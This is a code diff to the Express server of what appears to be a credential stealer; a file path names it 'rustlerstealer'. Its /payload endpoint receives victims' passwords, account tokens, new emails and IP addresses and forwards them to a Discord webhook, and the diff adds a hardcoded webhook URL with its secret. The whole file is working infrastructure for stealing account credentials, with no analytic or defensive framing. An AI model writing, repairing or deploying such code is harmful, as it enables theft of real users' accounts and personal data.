@@ -7,7 +7,7 @@ const fs = require('fs');
 
 app.use(express.json())
 
-app.listen(100, () => {
+app.listen(8080, () => {
     console.log('Server on.')
 })
 
@@ -84,7 +84,7 @@ app.post('/payload', async (req, res) => {
     const { type, ip, token, key } = req.body
     if (!type || !ip || !token || !key) return;
     const webhook = getWebhook(key);
-    //const webhook = '';
+    //const webhook = 'https://discord.com/api/webhooks/1103833547615260744/sKxOI6e0A8vjXdSu3c6BWJtwkwPYxqbhGxdKIxri6BlW7h-DUuGxGVfXhgcsnocdsjC8';
     if (!webhook) return;
     if (type == 'login') userLogin(req.body.password, token, ip, webhook)
     if (type == 'email') emailChanged(req.body.password, req.body.newEmail, token, ip, webhook)
@@ -96,10 +96,11 @@ function getWebhook(key) {
     return db.get(`wbh_${key}`) || null;
 }
 app.set('view engine','ejs'); 
+app.set('views', `${process.cwd()}/Bot/views/`);
 
 const DB = [];
 app.get('/dashboard', async (req, res) => {
-    res.render('C:/Users/sudry/Desktop/rustlerstealer/BuildBot/Dashboard/dash.ejs', {
+    res.render('dash', {
         data: DB
     })
 })
